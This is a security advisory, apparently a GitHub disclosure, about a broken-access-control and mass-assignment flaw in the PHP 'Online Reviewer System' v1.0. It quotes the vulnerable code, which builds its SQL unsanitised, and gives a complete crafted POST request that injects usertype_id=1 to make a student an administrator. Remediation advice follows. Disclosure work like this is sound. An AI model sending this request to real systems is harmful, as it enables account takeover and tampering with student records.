# Privilege Escalation via Broken Access Control in Online Reviewer System v1.0

## 1. Vulnerability Summary
- **Vulnerability Type:** Privilege Escalation / Broken Access Control / Mass Assignment
- **Vendor:** Fabian Ros (Code-Projects)
- **Product:** Online Reviewer System in PHP
- **Version:** v1.0
- **Software Link:** [(https://code-projects.org/online-reviewer-system-in-php-with-source-code/)](https://code-projects.org/online-reviewer-system-in-php-with-source-code/)
- **Severity:** Critical

## 2. Description
A vulnerability exists in the "Online Reviewer System" that allows low-privileged users (such as Students or Teachers) to escalate their privileges to Administrator. The application suffers from Missing Function Level Access Control and Mass Assignment in the user profile update endpoint (`btn_functions.php`).

The backend fails to verify the authorization level of the user making the request. An attacker can manipulate the HTTP POST request by injecting the `usertype_id=1` parameter. The application blindly accepts this input and updates the current user's role in the database, granting them full administrative access.

## 3. Root Cause Analysis
The vulnerability is located in `/reviewer/system/system/admins/manage/users/btn_functions.php`.

When the `btnUpdateUser` POST request is sent, the server retrieves parameters directly from the user input (`$_REQUEST`), including the highly sensitive `usertype_id` parameter. The application updates the database record corresponding to the current `$_SESSION['user_id']` without checking if the session belongs to an authorized Administrator.

```php
// Vulnerable Code Snippet in btn_functions.php
if(isset($_REQUEST['btnUpdateUser'])){
    $user_id =$_SESSION['user_id'];
    ...
    $usertype_id =$_REQUEST['usertype_id']; // Unvalidated input
    ...
    // Directly updates the database with user-controlled role
    $stmt = "UPDATE users SET usertype_id = '$usertype_id', ... WHERE user_id = '$user_id' ";
    $conn->exec($stmt);
}
```

## 4. Proof of Concept (PoC)
To reproduce the vulnerability, follow these steps:

### Step 1: Log in to the application as a standard, low-privileged user (e.g., Student). Note your current session cookie (PHPSESSID).
> **Important Session Note:** Each user account must have its own distinct session. Ensure you use an **Incognito / Private window** or log out completely before switching accounts to capture a **different, unique `PHPSESSID`** for the target account. Do not reuse the same session cookie across multiple accounts, as separate accounts must have independent cookies.

### Step 2: Intercept the web traffic using a proxy tool like Burp Suite, or use cURL to send a crafted HTTP POST request to the administrative API endpoint. Inject usertype_id=1 into the body.

Malicious HTTP Request:


```http
POST /reviewer/system/system/admins/manage/users/btn_functions.php HTTP/1.1
Host: [YOUR_TARGET_IP_OR_DOMAIN]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:155.0) Gecko/20100101 Firefox/155.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: [YOUR_CONTENT_LENGTH]
Origin: http://[YOUR_TARGET_IP_OR_DOMAIN]
Connection: keep-alive
Referer: http://[YOUR_TARGET_IP_OR_DOMAIN]/reviewer/system/system/admins/manage/users/user-update.php?user_id=[TARGET_USER_ID]
Cookie: PHPSESSID=[YOUR_VALID_SESSION_COOKIE]
Upgrade-Insecure-Requests: 1
Priority: u=0, i

usertype_id=1&firstname=[NEW_FIRSTNAME]&middlename=[NEW_MIDDLENAME]&lastname=[NEW_LASTNAME]&username=[NEW_USERNAME]&password=[NEW_PASSWORD]&btnUpdateUser=Save+changes
```

### Step 3: Send the request. The server will process the update and redirect you.

### Step 4: Refresh your browser. Your account role has now been successfully escalated to Administrator, granting you full control over the system's backend (managing exams, modifying other users, etc.).
- Image of request & response:
<img width="918" height="517" alt="Screenshot_34" src="https://github.com/user-attachments/assets/8e4e33b2-ecb8-4da5-8530-897727683eb3" />
<img width="921" height="597" alt="Screenshot_35" src="https://github.com/user-attachments/assets/b3763267-3708-41a6-83e0-87213aecd8e8" />


- Dashboard Admin Access :

Before :
<img width="1919" height="559" alt="Screenshot_31" src="https://github.com/user-attachments/assets/e3437c55-3ad9-42e3-97da-2efb8eadd6e2" />
After :
<img width="1918" height="487" alt="Screenshot_36" src="https://github.com/user-attachments/assets/0866e38b-63ef-4b60-81f2-9f49fa8e8605" />


## 5. Impact
An attacker can completely compromise the application. They can access sensitive data, manipulate exam questions, modify student grades, delete other users (including legitimate admins), and potentially achieve further exploitation depending on admin functionalities (e.g., File Upload leading to RCE).

## 6. Remediation
- **Enforce Endpoint Access Control:** Do not rely on hiding UI elements (Security through Obscurity). The application must enforce strict access controls at the file/routing level, ensuring that files within the `/admins/` directory cannot be directly accessed or executed by non-admin sessions.
- **Implement Authorization Checks:** The backend must explicitly verify that `$_SESSION['usertype_id'] == 1` before processing any role modification logic inside `btn_functions.php`.
- **Prevent Mass Assignment:** Separate the "Update Profile" feature for regular users from the "Manage Users" feature for Admins. Never accept or blindly bind the `usertype_id` parameter from HTTP requests in standard user profile updates.

## 7. Disclosure Timeline
- Sep 09, 2026: Vulnerability discovered.
- Sep 09, 2026: Public disclosure and CVE request submitted (No contact details for the author could be located. Technical details and PoC are fully documented in the provided GitHub).
